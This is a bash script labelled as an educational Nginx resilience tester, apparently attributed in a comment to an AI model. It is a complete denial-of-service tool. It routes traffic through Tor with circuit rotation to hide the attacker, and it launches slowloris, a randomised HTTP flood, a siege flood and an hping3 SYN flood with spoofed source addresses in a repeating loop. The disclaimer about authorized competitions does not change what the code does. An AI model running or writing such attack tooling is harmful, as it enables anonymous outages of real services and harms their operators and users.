#!/bin/bash
# Windows_Nginx_Tester.sh
# Purpose: Educational script to test Nginx on Windows service resilience
# Usage: ./Windows_Nginx_Tester.sh [target_ip] [duration_in_minutes]
# Author: Claude for educational purposes
# Note: Use only in authorized cyber defense competitions

# Check if arguments are provided
if [ $# -lt 2 ]; then
  echo "Usage: $0 [target_ip] [duration_in_minutes]"
  exit 1
fi

TARGET_IP=$1
DURATION=$(($2 * 60))  # Convert minutes to seconds
END_TIME=$(($(date +%s) + $DURATION))

# Install required packages
echo "[*] Installing required packages..."
sudo apt-get update
sudo apt-get install -y python3-pip tor proxychains siege apache2-utils hping3

# Install Python packages
pip3 install requests PySocks slowloris

# Configure TOR for IP rotation
echo "[*] Configuring TOR for IP rotation..."
sudo systemctl start tor
sudo bash -c 'echo "MaxCircuitDirtiness 35" >> /etc/tor/torrc'
sudo bash -c 'echo "NewCircuitPeriod 15" >> /etc/tor/torrc'
sudo systemctl restart tor

# Create connection rotation function
rotate_connection() {
  echo "[*] Rotating TOR circuit for new IP..."
  sudo killall -HUP tor
  sleep 2
}

# Create Python script for complex HTTP requests
cat > nginx_test.py << 'EOF'
import requests
import random
import sys
import time
import string
from concurrent.futures import ThreadPoolExecutor

target_ip = sys.argv[1]
base_url = f"http://{target_ip}"

# List of paths to try (including some that might trigger errors)
paths = [
    "/",
    "/index.html",
    "/api/",
    "/login",
    "/admin",
    "/wp-admin",
    "/config",
    "/test",
    "/images",
    "/.git/HEAD",
    "/wp-login.php",
    "/console"
]

# List of user agents to cycle through
user_agents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko)',
    'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) Version/13.0.3',
    'Mozilla/5.0 (iPad; CPU OS 13_3 like Mac OS X) AppleWebKit/605.1.15'
]

# Generate random query parameters
def random_params():
    num_params = random.randint(1, 5)
    params = {}
    for _ in range(num_params):
        param_name = ''.join(random.choice(string.ascii_lowercase) for _ in range(5))
        param_value = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(10))
        params[param_name] = param_value
    return params

# Function to make a single request
def make_request():
    try:
        path = random.choice(paths)
        url = f"{base_url}{path}"
        headers = {'User-Agent': random.choice(user_agents)}
        
        # Different request methods
        method = random.choice(['GET', 'HEAD', 'POST', 'OPTIONS'])
        
        if method == 'GET':
            params = random_params()
            requests.get(url, headers=headers, params=params, timeout=2)
        elif method == 'HEAD':
            requests.head(url, headers=headers, timeout=1)
        elif method == 'POST':
            data = '=' * random.randint(100, 500)
            requests.post(url, headers=headers, data=data, timeout=2)
        elif method == 'OPTIONS':
            requests.options(url, headers=headers, timeout=1)
            
        time.sleep(random.uniform(0.05, 0.2))
    except Exception:
        pass

# Make concurrent requests
with ThreadPoolExecutor(max_workers=20) as executor:
    for _ in range(100):
        executor.submit(make_request)
EOF

echo "[*] Beginning Windows Nginx service resilience testing against $TARGET_IP for $DURATION seconds"
echo "[*] Testing started at: $(date)"

# Main execution loop
while [ $(date +%s) -lt $END_TIME ]; do
  # Rotate connection every 35 seconds
  if [ $(( $(date +%s) % 35 )) -eq 0 ]; then
    rotate_connection
  fi
  
  # 1. Slowloris attack
  echo "[*] Testing connection pool handling..."
  timeout 30s proxychains python3 -c "
import slowloris
import time
slowloris.slowloris('$TARGET_IP', num_sockets=150, sleeptime=10, https=False)
time.sleep(25)
" &
  
  # 2. HTTP request flood with Python script
  echo "[*] Testing request handling capacity..."
  proxychains python3 nginx_test.py $TARGET_IP &
  
  # 3. High-concurrency testing with Siege
  echo "[*] Testing concurrent connection handling..."
  proxychains siege -c 50 -t 30s http://$TARGET_IP &
  
  # 4. TCP SYN flood with hping3
  echo "[*] Testing TCP connection handling..."
  timeout 25s sudo hping3 $TARGET_IP -S -p 80 --flood -d 120 --rand-source &
  
  # Wait before next round
  sleep 30
  echo "[*] Completed round at $(date), continuing test..."
  
  # Clean up zombie processes
  pkill -f "python3" 2>/dev/null
  pkill -f "siege" 2>/dev/null
  pkill -f "hping3" 2>/dev/null
done

# Cleanup
rm -f nginx_test.py
echo "[*] Test completed at: $(date)"
